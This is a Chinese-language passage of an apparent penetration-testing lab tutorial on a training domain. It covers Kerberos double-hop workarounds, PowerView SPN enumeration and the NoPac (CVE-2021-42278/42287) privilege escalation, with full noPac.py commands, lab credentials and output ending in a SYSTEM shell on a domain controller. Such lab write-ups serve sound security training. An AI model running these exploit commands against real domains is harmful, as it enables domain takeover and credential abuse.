<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;!qazXSW@&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt;  <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\backupadm&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure>

<p>现在可以尝试使用 PowerView 查询 SPN 帐户，因为将凭据与命令一起传递了。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> <span class="literal">-credential</span> <span class="variable">$Cred</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">azureconnect</span><br><span class="line">backupjob</span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br><span class="line">sqltest</span><br><span class="line">sqlqa</span><br><span class="line">sqldev</span><br><span class="line">mssqladm</span><br><span class="line">svc_sql</span><br><span class="line">sqlprod</span><br><span class="line">sapsso</span><br><span class="line">sapvc</span><br><span class="line">vmwarescvc</span><br></pre></td></tr></table></figure>

<p>如果通过 RDP 连接到同一台主机，打开 CMD 提示符并输入<code>klist</code>，将看到已缓存必要的票证，可以直接与域控制器交互，并且不必再担心双跳问题，因为密码已存储在内存中，因此它可以与发出的每个请求一起发送。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">klist</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Current</span> <span class="title">LogonId</span> <span class="title">is</span> 0:0<span class="title">x1e5b8b</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Cached</span> <span class="title">Tickets</span>: (4)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#0&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">krbtgt</span>/<span class="title">INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x60a10000</span> -&gt; <span class="title">forwardable</span> <span class="title">forwarded</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0<span class="title">x2</span> -&gt; <span class="title">DELEGATION</span></span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#1&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">krbtgt</span>/<span class="title">INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40e10000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">initial</span> <span class="title">pre_authent</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0<span class="title">x1</span> -&gt; <span class="title">PRIMARY</span></span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#2&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">ProtectedStorage</span>/<span class="title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40a50000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">ok_as_delegate</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0</span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#3&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">cifs</span>/<span class="title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40a50000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">ok_as_delegate</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0</span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Workaround-2-Register-PSSession-Configuration"><a href="#Workaround-2-Register-PSSession-Configuration" class="headerlink" title="Workaround #2: Register PSSession Configuration"></a>Workaround #2: Register PSSession Configuration</h3><p>如果在加入域的主机上，并且可以使用 WinRM 远程连接到另一台主机，该怎么办？或者在 Windows 攻击主机上工作，并使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2">Enter-PSSession cmdlet</a>通过 WinRM 连接到目标？在这里，还有另一种选择来更改设置，以便能够直接与 DC 或其他主机&#x2F;资源进行交互，而不必设置 PSCredential 对象并在每个命令中包含凭据（对于某些工具，这可能不是一个选项）。</p>
<p>首先在远程主机上建立一个 WinRM 会话。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-AEN-DEV01</span>.INLANEFREIGHT.LOCAL <span class="literal">-Credential</span> inlanefreight\backupadm</span><br></pre></td></tr></table></figure>

<p>在这里，使用的一个技巧是<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2">Register-PSSessionConfiguration</a> cmdlet 注册一个新的会话配置。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Register-PSSessionConfiguration</span> <span class="literal">-Name</span> backupadmsess <span class="literal">-RunAsCredential</span> inlanefreight\backupadm</span><br><span class="line"></span><br><span class="line"> WARNING: When RunAs is enabled <span class="keyword">in</span> a Windows PowerShell session configuration, the Windows security model cannot enforce</span><br><span class="line"> a security boundary between different user sessions that are created by <span class="keyword">using</span> this endpoint. Verify that the Windows</span><br><span class="line">PowerShell runspace configuration is restricted to only the necessary <span class="built_in">set</span> of cmdlets and capabilities.</span><br><span class="line">WARNING: <span class="built_in">Register-PSSessionConfiguration</span> may need to restart the WinRM service <span class="keyword">if</span> a configuration <span class="keyword">using</span> this name has</span><br><span class="line">recently been unregistered, certain system <span class="keyword">data</span> structures may still be cached. <span class="keyword">In</span> that case, a restart of WinRM may be</span><br><span class="line"> required.</span><br><span class="line">All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session</span><br><span class="line">configurations that are created with the <span class="built_in">Register-PSSessionConfiguration</span> cmdlet, are disconnected.</span><br><span class="line"></span><br><span class="line">   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin</span><br><span class="line"></span><br><span class="line"><span class="built_in">Type</span>            Keys                                Name</span><br><span class="line"><span class="literal">----</span>            <span class="literal">----</span>                                <span class="literal">----</span></span><br><span class="line">Container       &#123;Name=backupadmsess&#125;                backupadmsess</span><br></pre></td></tr></table></figure>

<p>完成后，需要通过输入<code>Restart-Service WinRM</code>当前的 PSSession 来重新启动 WinRM 服务。这会将当前 Session 踢出，因此使用之前设置的命名注册会话启动一个新的 PSSession。</p>
<p>启动会话后，可以看到双跳问题已消除，如果输入<code>klist</code>，将获得到达域控制器所需的缓存票证。这是可行的，因为本地计算机现在将在用户的上下文中模拟远程计算机<code>backupadm</code>，并且来自本地计算机的所有请求都将直接发送到域控制器。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DEV01 <span class="literal">-Credential</span> INLANEFREIGHT\backupadm <span class="literal">-ConfigurationName</span>  backupadmsess</span><br><span class="line">[<span class="type">DEV01</span>]: <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x2239ba</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">       Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">       KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">       <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">23</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       Renew Time: <span class="number">7</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">       Kdc Called: DC01</span><br></pre></td></tr></table></figure>

<p>现在，可以运行 PowerView 等工具，而无需创建新的 PSCredential 对象。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">DEV01</span>]: <span class="built_in">PS</span> C:\Users\Public&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">azureconnect</span><br><span class="line">backupjob</span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br><span class="line">sqltest</span><br><span class="line">sqlqa</span><br><span class="line">sqldev</span><br><span class="line">mssqladm</span><br><span class="line">svc_sql</span><br><span class="line">sqlprod</span><br><span class="line">sapsso</span><br><span class="line">sapvc</span><br><span class="line">vmwarescvc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：无法从 evil-winrm shell 使用 <code>Register-PSSessionConfiguration</code>，因为无法获取凭据弹出窗口。此外，如果尝试通过首先设置 PSCredential 对象，然后尝试通过传递凭据（如 <code>-RunAsCredential $Cred</code>）来运行命令来运行此命令，将收到错误，因为只能从提升的 PowerShell 终端使用 <code>RunAs</code>。因此，此方法无法通过 evil-winrm 会话工作，因为它需要 GUI 访问和适当的 PowerShell 控制台。此外，在测试中，由于 Linux 上的 PowerShell 处理 Kerberos 凭据的方式存在某些限制，无法从 Parrot 或 Ubuntu 攻击主机上的 PowerShell 使用此方法。如果从 Windows 攻击主机进行测试并拥有一组凭据或入侵主机并可以通过 RDP 连接将其用作“跳转主机”来对环境中的主机发起进一步攻击，则此方法仍然非常有效。</p>
</blockquote>
<p>还可以使用其他方法，例如 CredSSP、端口转发或注入在目标用户上下文中运行的进程（牺牲进程）。</p>
<hr>
<h1 id="Bleeding-Edge-Vulnerabilities"><a href="#Bleeding-Edge-Vulnerabilities" class="headerlink" title="Bleeding Edge Vulnerabilities"></a>Bleeding Edge Vulnerabilities</h1><p>在补丁管理和周期方面，许多组织不会迅速通过其网络推出补丁。正因为如此，可能能够使用非常新的策略快速获得初始访问或域特权升级的胜利。在撰写本文时（2022 年 4 月），本节中展示的三种技术相对较新。与任何攻击一样，如果您不了解这些攻击的工作原理或它们可能对生产环境造成的风险，最好不要在现实世界尝试它们。话虽如此，这些技术可以被认为是“安全的”，并且比<a target="_blank" rel="noopener" href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/">Zerologon</a>或<a target="_blank" rel="noopener" href="https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/">DCShadow</a>等攻击破坏性更小。不过，应该始终保持谨慎，做详细的笔记。所有攻击都伴随着风险。</p>
<h2 id="NoPac-SamAccountName-Spoofing"><a href="#NoPac-SamAccountName-Spoofing" class="headerlink" title="NoPac (SamAccountName Spoofing)"></a>NoPac (SamAccountName Spoofing)</h2><p><a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699">Sam_The_Admin 漏洞</a>，也称为<code>noPac</code>或称为<code>SamAccountName Spoofing</code>2021 年底发布的漏洞。此漏洞包含两个 CVE <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278">2021-42278</a>和<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287">2021-42287</a>，允许通过一个命令将域内权限从任何标准域用户提升到域管理员级别访问。以下是每个 CVE 对此漏洞提供的简要分析。</p>
<table>
<thead>
<tr>
<th>42278</th>
<th>42287</th>
</tr>
</thead>
<tbody><tr>
<td><code>42278</code>是安全帐户管理器 (SAM) 的一个绕过漏洞。</td>
<td><code>42287</code>是 ADDS 中的 Kerberos 特权属性证书 (PAC) 中的一个漏洞。</td>
</tr>
</tbody></table>
<p>此漏洞利用路径利用了将<code>SamAccountName</code>计算机帐户更改为域控制器帐户的能力。默认情况下，经过身份验证的用户最多可以将<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain">十台计算机添加到域中</a>。执行此操作时，将新主机的名称更改为与域控制器的 SamAccountName 匹配。完成后，必须请求 Kerberos 票证，以使服务以 DC 的名称而不是新名称向发出票证。请求 TGS 时，它将发出具有最接近匹配名称的票证。完成后，将以该服务的身份进行访问，甚至可以在域控制器上获得 SYSTEM shell。此<a target="_blank" rel="noopener" href="https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware">博客文章</a>详细介绍了攻击流程。</p>
<p>NoPac 使用 Impacket 中的许多工具与目标 DC 进行通信、上传有效负载以及发出命令。</p>
<h3 id="Scanning-for-NoPac"><a href="#Scanning-for-NoPac" class="headerlink" title="Scanning for NoPac"></a>Scanning for NoPac</h3><p>注意到<code>ms-DS-MachineAccountQuota</code>属性，用于控制和限制在特定 OU 中创建计算机帐户的权限，默认值是10。当<code>ms-DS-MachineAccountQuota</code> 属性的值设置为 0 意味着该用户或组在特定的组织单位 (OU) 中无法创建任何计算机帐户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                           </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484</span><br><span class="line">[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663</span><br></pre></td></tr></table></figure>

<h3 id="NoPac-Getting-a-Shell"><a href="#NoPac-Getting-a-Shell" class="headerlink" title="NoPac &amp; Getting a Shell"></a>NoPac &amp; Getting a Shell</h3><p>有很多不同的方法可以使用 NoPac 来进一步获取访问权限。一种方法是获取具有 SYSTEM 级权限的 shell。可以通过使用以下语法运行 noPac.py 来模拟内置管理员帐户并进入目标域控制器上的半交互式 shell 会话。这可能会很“嘈杂”，也可能会被 AV 或 EDR 阻止。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                               </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Adding Computer Account &quot;WIN-LWJFQMAXRVN$&quot;</span><br><span class="line">[*] MachineAccount &quot;WIN-LWJFQMAXRVN$&quot; password = &amp;A#x8X^5iLva</span><br><span class="line">[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A#x8X^5iLva.</span><br><span class="line">[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01</span><br><span class="line">[*] Saving ticket in ACADEMY-EA-DC01.ccache</span><br><span class="line">[*] Resting the machine account to WIN-LWJFQMAXRVN$</span><br><span class="line">[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value</span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Impersonating administrator</span><br><span class="line">[*] 	Requesting S4U2self</span><br><span class="line">[*] Saving ticket in administrator.ccache</span><br><span class="line">[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Rename ccache with target ...</span><br><span class="line">[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$</span><br><span class="line">[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>注意，使用 smbexec.py 与目标建立了半交互式 shell 会话。使用 smbexec shell 时，需要使用精确路径，而不是使用 cd 浏览目录结构。</p>
<p>NoPac.py 确实将 TGT 保存在运行漏洞的攻击主机的目录中。可以用它<code>ls</code>来确认。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils</span><br><span class="line">README.md  scanner.py</span><br></pre></td></tr></table></figure>

